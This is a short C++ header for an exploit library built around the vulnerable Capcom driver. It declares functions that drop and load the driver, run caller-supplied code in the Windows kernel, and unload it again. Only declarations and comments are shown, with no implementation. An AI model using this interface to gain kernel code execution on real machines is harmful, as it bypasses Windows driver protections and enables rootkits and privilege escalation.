#pragma once
#define WIN32_NO_STATUS
#include <Windows.h>
#include <Winternl.h>
#undef WIN32_NO_STATUS
#include <functional>

typedef PVOID(NTAPI* MmGetSystemRoutineAddress_t)(PUNICODE_STRING);

/*
	Initialize the capcom exploit by:
		1. Dropping the driver file baked inside this library onto disk
		2. Use ZwLoadDriver to load the driver
		3. Initialize the wrapper class to set up code execution
	Keep in mind that if this function call fails, the capcom driver WILL
	remain loaded on your system.

	@return true if exploit was loaded properly, false if failed
*/
extern bool init_exploit();

extern void execute_in_kernel(std::function<void(MmGetSystemRoutineAddress_t)> user_function);

/*
	Clean up the capcom exploit by:
		1. Closing the handle to the wrapper class
		2. Use ZwUnloadDriver to unload the driver
		3. Delete the driver file dropped onto disk
		4. Free the wrapper instance

	@return true if exploit was unloaded properly, false if failed
*/
extern bool cleanup_exploit();